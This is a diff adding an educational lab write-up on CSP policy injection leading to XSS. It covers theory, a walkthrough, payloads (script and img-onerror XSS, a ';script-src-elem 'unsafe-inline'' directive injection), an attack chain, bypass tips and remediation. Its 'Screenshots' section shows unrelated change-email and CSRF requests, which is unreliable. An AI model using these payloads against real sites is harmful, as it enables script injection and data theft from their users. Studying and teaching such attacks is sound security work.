@@ -12393,3 +12393,452 @@ This lab demonstrates how an attacker can bypass strict CSP protections by lever
 ---
 
 **When JavaScript is blocked, hijack the form — the browser executes the attack for you**
+
+---
+
+# 🐞 Lab-30 — CSP Policy Injection → XSS (FINAL)
+
+---
+
+## 🧠 🔥 Overview (Full Theory + Insight)
+
+This lab demonstrates an advanced *CSP bypass using policy injection, where an attacker gains control over the **Content Security Policy itself*.
+
+---
+
+👉 Normally CSP blocks inline JavaScript:
+
+```
+<script>alert(1)</script>
+
+```
+---
+
+👉 But in this lab:
+
+User-controlled input (token) is reflected inside the *CSP header*
+
+---
+
+👉 This allows attacker to:
+
+✔ Inject new CSP directives  
+✔ Weaken browser security  
+✔ Execute XSS  
+
+---
+
+## 🧠 🟦 Core Idea
+
+*If attacker controls CSP → attacker controls browser security rules*
+
+---
+
+## 🧠 🟥 Key Exploit
+
+
+;script-src-elem 'unsafe-inline'
+
+
+---
+
+👉 Injects new directive → allows inline scripts  
+
+---
+
+## 🔍 🧠 What Is This Topic?
+
+### 🔹 CSP Injection
+
+Injecting malicious directives into CSP via user-controlled input  
+
+---
+
+## 🧠 Why It Works
+
+✔ CSP dynamically generated  
+✔ Developer includes user input (token)  
+✔ No sanitization  
+✔ ; breaks directive → inject new rule  
+
+---
+
+## 🧪 🟩 Lab Walkthrough (STEP-BY-STEP)
+
+---
+
+### 🧩 Step 1 — Test XSS
+
+```
+<img src=1 onerror=alert(1)>
+```
+
+---
+
+👉 Result:
+
+✔ Reflected  
+❌ Blocked by CSP  
+
+---
+
+### 🧩 Step 2 — Inspect CSP
+
+
+Content-Security-Policy:
+default-src 'self';
+script-src 'self';
+report-uri /csp-report?token=
+
+
+---
+
+👉 Key observation:
+
+
+token
+
+
+is part of CSP header  
+
+---
+
+### 🧩 Step 3 — Understand Behavior
+
+Initial request:
+
+
+GET /?search=payload
+
+
+---
+
+👉 Browser triggers:
+
+
+POST /csp-report
+
+
+---
+
+👉 This is only a report (not exploit path)  
+
+---
+
+### 🧩 Step 4 — Test Control
+
+
+/?search=test&token=AAAA
+
+
+---
+
+👉 Response contains:
+
+
+report-uri /csp-report?token=AAAA
+
+
+---
+
+👉 ✅ Confirmation:
+
+User controls CSP value  
+
+---
+
+### 🧩 Step 5 — Inject CSP Rule
+
+```
+/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
+```
+
+---
+
+👉 What happens:
+
+✔ ; breaks directive  
+✔ New rule injected  
+✔ Inline scripts allowed  
+
+---
+
+### 🧩 Step 6 — Execute Payload
+
+```
+<script>alert(1)</script>
+```
+
+---
+
+👉 ✅ XSS SUCCESS  
+
+---
+
+## 📸 Screenshots (Request Flow)
+
+---
+
+### 🟢 GET Request (Token Leaked in URL)
+
+
+GET /csp-report?email=test@test.com&csrf=ABC123
+
+
+![get-request](../images/csp-get-request.png)
+
+---
+
+### 🔴 POST Request (Browser Override with Token)
+
+
+POST /my-account/change-email
+Content-Type: application/x-www-form-urlencoded
+
+email=test@test.com&csrf=ABC123
+
+
+![post-request](../images/csp-post-request.png)
+
+---
+
+## 💣 🟨 Payload Breakdown (Easy)
+
+---
+
+### 🔹 XSS Payload
+
+```
+<script>alert(1)</script>
+```
+
+---
+
+### 🔹 CSP Injection
+
+
+;script-src-elem 'unsafe-inline'
+
+
+---
+
+### 🧠 Breakdown
+
+
+;                  → start new directive
+script-src-elem    → control <script> tags
+'unsafe-inline'    → allow inline JS
+
+
+---
+
+👉 Important:
+
+
+script-src-elem
+
+
+overrides:
+
+
+script-src
+
+
+---
+
+## 🌍 🟥 Real-World Scenarios (100% Practical)
+
+---
+
+### 🔥 Scenario 1 — CSP Reporting Endpoints
+
+
+/csp-report?token=user_input
+
+
+---
+
+### 🔥 Scenario 2 — Logging Systems
+
+
+/log?msg=user_input
+
+
+---
+
+### 🔥 Scenario 3 — Multi-Tenant Apps
+
+
+tenant=abc
+
+
+→ used inside CSP  
+
+---
+
+### 🔥 Scenario 4 — Debug Features
+
+
+/debug?param=user_input
+
+
+---
+
+### 🔥 Scenario 5 — CDN Misconfig
+
+```
+script-src cdn.com ${userInput}
+```
+
+---
+
+## ⚔️ 🧠 Attack Chain
+
+---
+
+1️⃣ Find reflection  
+2️⃣ Inspect CSP  
+3️⃣ Identify controllable param  
+4️⃣ Inject ;  
+5️⃣ Add unsafe directive  
+6️⃣ Execute JS  
+7️⃣ Steal data / takeover  
+
+---
+
+## 🎯 High-Value Endpoints
+
+---
+
+```
+/search?q=
+/my-account?email=
+/csp-report
+/error
+/api?client=
+/debug
+```
+
+---
+
+## ⚠️ 🟥 Real-World Limitations + Bypass
+
+---
+
+### ❌ Not Reflected
+
+👉 No injection possible  
+
+---
+
+### ❌ Sanitized Input
+
+👉 ; blocked  
+
+✔ Bypass:
+
+
+encoding / alternate params
+
+
+---
+
+### ❌ Strong CSP (nonce/hash)
+
+✔ Bypass:
+
+
+Inject new directive
+Override via script-src-elem
+
+
+---
+
+### ❌ Browser Differences
+
+👉 Works best in Chrome  
+
+---
+
+## 🛡️ 🔒 Remediation (VERY IMPORTANT)
+
+---
+
+### 🔴 Root Problem
+
+User input used inside CSP header  
+
+---
+
+### ✅ Fix 1 — Never Trust User Input
+
+Do NOT include user input in CSP  
+
+---
+
+### ✅ Fix 2 — Use Static CSP
+
+
+report-uri /csp-report
+
+
+---
+
+### ✅ Fix 3 — Sanitize Input
+
+Remove:
+
+
+; ' " < >
+
+
+---
+
+### ✅ Fix 4 — Avoid Dynamic CSP
+
+❌ Bad:
+
+
+"CSP: " + userInput
+
+
+---
+
+### ✅ Fix 5 — Use Nonce-Based CSP
+
+
+script-src 'nonce-random123'
+
+
+---
+
+### ✅ Fix 6 — Monitor Safely
+
+Use reporting without reflection  
+
+---
+
+## 🧠 🟪 Mental Model
+
+---
+
+CSP = security rules  
+token = injection point  
+you = rule modifier  
+
+---
+
+## 🎯 🧠 Final Summary
+
+---
+
+✔ CSP is powerful but fragile  
+✔ If attacker controls CSP → full XSS  
+
+---
+
+## 🔥 Final One-Liner
+
+---
+
+*CSP injection = turning defense into attack*
